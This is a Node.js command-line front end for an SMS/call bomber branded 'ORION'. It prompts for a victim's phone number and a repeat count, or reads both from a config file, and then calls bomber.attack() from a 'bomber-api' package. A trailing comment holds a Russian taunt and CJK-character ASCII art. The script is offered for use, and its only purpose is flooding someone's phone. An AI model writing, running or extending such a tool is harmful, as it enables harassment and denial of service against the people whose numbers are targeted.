const bomber = require("bomber-api");
const inquirer = require("inquirer");
const { clear } = require("console");
const { exit } = require("process");
const config = require("./config.json");

clear();

console.log("________        .__               ");
console.log("\\_____  \\_______|__| ____   ____  ");
console.log(" /   |   \\_  __ \\  |/  _ \\ /    \\ ");
console.log("/    |    \\  | \\/  (  <_> )   |  \\");
console.log("\\_______  /__|  |__|\\____/|___|  /");
console.log("        \\/                     \\/ ");

call(async function () {
	let questions = [
		{
			type: "input",
			name: "useConfig",
			message: "[ORION]: Use Config? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() === "y" || value.toLowerCase() === "n";
				return valid || "[ORION]: Please Enter Y/N...";
			},
			filter: function (input) {
				if (input.toLowerCase() === "y" || input.toLowerCase() === "n") {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "targetNumber",
			message: "[ORION]: Target Number: ",
			when: function (value) {
				return value.useConfig.toLowerCase() === "n";
			},
			validate: function (input) {
				if (!/[8-8]{1,1}[0-9]{1,3}[0-9]{1,3}[0-9]{1,2}[0-9]{1,2}/.test(input)) {
					return "[ORION]: Please Enter Valid Phone Number... [8XXXXXXXXXX]";
				} else {
					return true;
				}
			},
			filter: function (input) {
				if (!/[8-8]{1,1}[0-9]{1,3}[0-9]{1,3}[0-9]{1,2}[0-9]{1,2}/.test(input)) {
					return "";
				} else {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "nor",
			message: "[ORION]: Number Of Repeats: ",
			when: function (value) {
				return value.useConfig.toLowerCase() === "n";
			},
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "[ORION]: Please Enter The Number...";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "start",
			message: "[ORION]: Start? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() === "y" || value.toLowerCase() === "n";
				return valid || "[ORION]: Please Enter Y/N...";
			},
			filter: function (input) {
				if (input.toLowerCase() === "y" || input.toLowerCase() === "n") {
					return input;
				}
				return "";
			},
		},
	];
	const info = await inquirer.prompt(questions);
	if (info.start.toLowerCase() == "y") {
		if (info.useConfig.toLowerCase() === "y") {
			bomber.attack(config.target_number, config.number_of_repeats);
		} else {
			bomber.attack(info.targetNumber, info.nor);
		}
	} else {
		setTimeout(() => {
			exit();
		}, 1000);
	}
});

function call(func) {
	return func();
}


/*

Ну и че ты тут забыл?

膩I嶮薤篝爰曷樔黎㌢´　　｀ⅷ
艇艀裲f睚鳫巓襴骸　　　　贒憊
殪幢緻I翰儂樔黎夢'”　 　 ,ｨ傾
盥皋袍i耘蚌紕偸′　　　 雫寬I
悗f篝嚠篩i縒縡齢　　 　 Ⅷ辨f
輯駲f迯瓲i軌帶′　　　　　`守I厖孩
幢儂儼巓襴緲′　 　 　 　 　 `守枢i磬廛
嚠篩I縒縡夢'´　　　 　 　 　 　 　 `守峽f
蚌紕襴緲′　　　           　 　  守畝
f瓲軌揄′　　　　　　　　　　　　　,gf毯綴
鳫襴鑿緲　　　　　　　　　　 　 　 奪寔f厦
絨緲′　　　　　　 　 　 　 　　　　 　 ”'罨悳
巓緲′　　　　　　 　 　 　 　 　 　 綴〟 ”'罨椁
巓登嶮 薤篝㎜㎜ g　 　 緲　 　 甯體i爺綴｡, ”'罨琥
I軌襴暹 甯幗緲fi'　　 緲',纜　　贒i綟碕碚爺綴｡ ”'罨皴
巓襴驫 霤I緲緲　　 纜穐穐 　甯絛跨飩i髢綴馳爺綴｡`'等誄

*/
